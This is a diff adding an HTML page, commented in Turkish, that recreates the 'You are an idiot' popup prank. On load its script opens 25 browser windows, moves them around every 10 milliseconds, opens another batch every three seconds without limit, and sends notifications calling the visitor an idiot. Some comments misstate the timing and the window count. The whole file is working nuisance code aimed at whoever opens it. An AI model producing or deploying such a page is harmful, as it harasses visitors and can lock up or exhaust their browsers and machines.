@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Otomatik Pencereler</title>
+</head>
+<body>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const numberOfWindows = 25;
+            const windows = [];
+            
+            // Bildirim izni kontrolü ve talebi
+            if (Notification.permission !== 'granted') {
+                Notification.requestPermission();
+            }
+
+            // Pencereleri aç ve her birinde bildirim gönder
+            function openWindows() {
+                for (let i = 0; i < numberOfWindows; i++) {
+                    const newWindow = window.open('You are an idiot.', '_blank', 'width=400,height=300');
+                    windows.push(newWindow);
+
+                    // Her pencere açıldığında bir bildirim gönder
+                    newWindow.onload = function() {
+                        new Notification('Sen bir aptalsın , hahahaha', {
+                            body: 'Sen Bir Aptalsın.',
+                            icon: 'https://example.com/icon.png' // Opsiyonel: Bildirim simgesi
+                        });
+                    };
+                }
+            }
+
+            // Pencereleri aç ve hareket ettir
+            function moveWindows() {
+                windows.forEach((win) => {
+                    if (win && !win.closed) {
+                        const x = Math.random() * (window.innerWidth - 400);
+                        const y = Math.random() * (window.innerHeight - 300);
+                        win.moveTo(x, y);
+                    }
+                });
+            }
+
+            // Pencereleri açma ve hareket ettirme işlemini başlat
+            function startProcess() {
+                openWindows();
+                setInterval(moveWindows, 10); // Pencereleri her 0.4 saniyede bir hareket ettir
+
+                // Her 3 saniyede bir 10 yeni pencere aç
+                setInterval(openWindows, 3000);
+            }
+
+            // Süreci başlat
+            startProcess();
+        });
+    </script>
+</body>
+</html>
